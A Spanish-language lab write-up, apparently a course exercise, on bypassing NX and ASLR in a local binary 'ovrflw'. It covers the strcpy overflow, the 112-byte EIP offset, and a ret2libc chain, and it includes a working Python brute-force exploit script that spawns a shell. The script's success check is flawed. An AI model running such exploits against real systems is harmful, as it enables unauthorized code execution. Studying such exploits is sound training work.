# Buffer-OverFlow Bypass de NX y ASLR

[ovrflw.rar](/assets/images/Buffer-Overflow-byp-nx-aslr/ovrflw.rar)

con ghidra leemos el codigo fuente del binario:

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled.png)

Vemos que tiene declarado un buffer de 112 y utiliza una funcion strcpy  que se considera insegura.

Si lo ponemos en practica, lo podemos ver utilizando:

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%201.png)

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%202.png)

### Explica paso por paso la metodología que has seguido con el debugger para reproducir la vulnerabilidad existente en el binario ovrflw. Recuerda que este punto debe de tener ASLR activo en el entorno de Linux.

Ejecutamos el binario con gdb-peda:

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%203.png)

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%204.png)

Vemos que tiene proteccion NX (No Execution)

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%205.png)

Creamos un pattern de 115 y se lo enviamos al binario

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%206.png)

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%207.png)

Hemos sobreescrito el EIP, tenemos que sacar el valor del offset

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%208.png)

Vemos que es de 112.

Comprobamos que el ASLR esta activo de la siguiente forma.

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%209.png)

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%2010.png)

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%2011.png)

Ejecutamos p system dos veces para ver que va cambiando.

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%2012.png)

Sacamos la direccion de system, exit y de sh.

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%2013.png)

```
#direcciones
	#p.system = 0xf7dddcc0 -> \xc0\xdc\xdd\xf7
	#p.exit = 0xf7dd0640 -> \x40\x06\xdd\xf7
	#sh = 0xf7f28b62 -> \x62\x8b\xf2\xf7

#rop = p.system+p.exit+sh
#rop = "\xc0\xdc\xdd\xf7\x40\x06\xdd\xf7\x62\x8b\xf2\xf7"
```

Creamos un one-liner que nos ejecute en un bucle infinito una cadena para ocasionar un choque, y consiga ocasionar una llamada exitosa y nos otorgue una sh

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%2014.png)

Podemos crear un exploit para automatizarlo:

```python
#!/usr/bin/python3
from pwn import *
from struct import pack
from subprocess import call

#direcciones
	#p.system = 0xf7dddcc0 -> \xc0\xdc\xdd\xf7
	#p.exit = 0xf7dd0640 -> \x40\x06\xdd\xf7
	#sh = 0xf7f28b62 -> \x62\x8b\xf2\xf7

#rop = p.system+p.exit+sh
#rop = "\xc0\xdc\xdd\xf7\x40\x06\xdd\xf7\x62\x8b\xf2\xf7"

rop = pack("<I", 0xf7dddcc0)
rop += pack("<I", 0xf7dd0640)
rop += pack("<I", 0xf7f28b62)

buffer = b"A"*112
buffer += rop

def main():
	while os.system("echo $0") != "/bin/sh":
		response = call(["./ovrflw", buffer])
	else:
		sys.exit(1)

main()
```

Lo ejecutamos:

![Untitled](/assets/images/Buffer-Overflow-byp-nx-aslr/Untitled%2015.png)